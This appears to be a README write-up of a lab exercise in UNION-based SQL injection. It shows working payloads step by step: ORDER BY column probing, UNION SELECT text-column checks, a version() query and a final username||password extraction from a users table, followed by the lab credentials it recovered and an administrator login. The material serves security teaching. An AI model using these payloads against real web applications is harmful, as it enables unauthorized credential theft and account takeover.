# SQLI-Union-Single-Column-Extraction
This project demonstrates a UNION-based SQL injection attack used to retrieve multiple values from a single column. It covers identifying the number of columns, locating text-compatible fields, crafting payloads, and extracting sensitive data such as usernames and passwords, leading to administrator access.
# ⚠️ Caution 
This project demonstrates offensive security techniques in a controlled lab environment. Unauthorized testing against real systems is illegal and unethical.

# 🎯 Objective
	•	Identify SQL injection vulnerability
	•	Extract usernames and passwords
	•	Gain administrative access

  # 🧰 Tools Used
	•	Burp Suite (interception & testing)
	•	Browser (Firefox + FoxyProxy)
	•	Target Lab Environment

  # Target Information
	•	Application Type: Web Application
	•	Vulnerability: SQL Injection (UNION-based)
	•	Entry Point: URL parameter (category, id, etc.)

  # 🔗 Methodology (Step-by-Step)
  
  * Step 1: Identify Injection Point
    
    <img width="1599" height="737" alt="UNION SQL2" src="https://github.com/user-attachments/assets/9a0c5793-635a-406e-8053-bffe2df05681" />

  * Input ' in the terget parameter if The application returned abnormal behavior → There is a possible SQL injection.

    <img width="1597" height="740" alt="UNION SQL3" src="https://github.com/user-attachments/assets/c434cc8b-ca8c-48d4-a239-46cfcb1e0699" />
  
  * Step 2: Determine Number of Columns
    
    * To do that you need to use the order by payload.
      
    ' ORDER BY 1--
    
    <img width="1599" height="739" alt="UNION SQL5" src="https://github.com/user-attachments/assets/13ec1dc9-55ea-42d6-9d3b-0de8ddd981d5" />

    ' ORDER BY 2--
    
    <img width="1598" height="740" alt="UNION SQL7" src="https://github.com/user-attachments/assets/75599142-64c8-40cf-aa7d-a213d4772848" />
    
    ' ORDER BY 3--

    <img width="1599" height="740" alt="UNION SQL9" src="https://github.com/user-attachments/assets/767197ba-913b-4236-8f4c-1122e589acec" />

    * Error at a specific number → determined total columns.
    
    <img width="1596" height="742" alt="UNION SQL10" src="https://github.com/user-attachments/assets/328b18bc-691c-4535-8ccd-d5195d8831aa" />

    * Step 3: Identify Column That Contains Text

      To do that we need to use this payload:
      ' UNION SELECT 'a', NULL-- if it ouput error means the first column doesn't use TEXT then we can chack for the second colum with this payload ' UNION SELECT NULL, 'a'-- if it do not output error it uses TEXT.

    <img width="1600" height="742" alt="UNION SQL12" src="https://github.com/user-attachments/assets/3fc768e9-6b2c-4346-b07d-f244a9f545df" />

      It didn't output error means the second column accepts TEXT.

    <img width="1600" height="742" alt="UNION SQL14" src="https://github.com/user-attachments/assets/40cfa54c-61a3-4a9a-aa75-86843f4897a8" />

     * Step 4: Exploitation (UNION Injection) since there is just one column that uses TEXT we will have to use String concatenation to make the data base output the username and password, but first we need to know the database and the data base version. To do that we will use this payload ' UNION select NULL, version()--

    <img width="1600" height="742" alt="UNION SQL21" src="https://github.com/user-attachments/assets/4f012290-1877-47b2-b5d4-5dbf8c4eb1e6" />

    Database name and version: PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
    Now we need to use syntax for PostgreSQL database String concatenation to output the username and password.

   * Final payload: ' UNION SELECT NULL, username ||'*'|| password FROM users-- 

   <img width="1600" height="742" alt="UNION SQL25" src="https://github.com/user-attachments/assets/ae337bb6-fe2e-4e83-b29e-20d032587dbb" />

   * Step 5: Data Extraction

     Collected usernames and passwords from response.
     
     Username1: administrator
     Password: nry59xysy2jvt52wsd8d

     Username2: carlos
     Password: nz2qhsmz7od3aptvc4qg

     Username3: wiener
     Password: v8njyah585vcycmt40cc

   <img width="1600" height="742" alt="UNION SQL25" src="https://github.com/user-attachments/assets/4cb54e85-bc48-4822-a2ca-38bab13a75a5" />
  
  *  Step 6: Privilege Escalation

     Used extracted credentials to log in.

   <img width="1600" height="742" alt="UNION SQL26" src="https://github.com/user-attachments/assets/52404213-0803-448e-8da1-e237ffe7226d" />
  

   Result: Successful login as administrator.

    

    
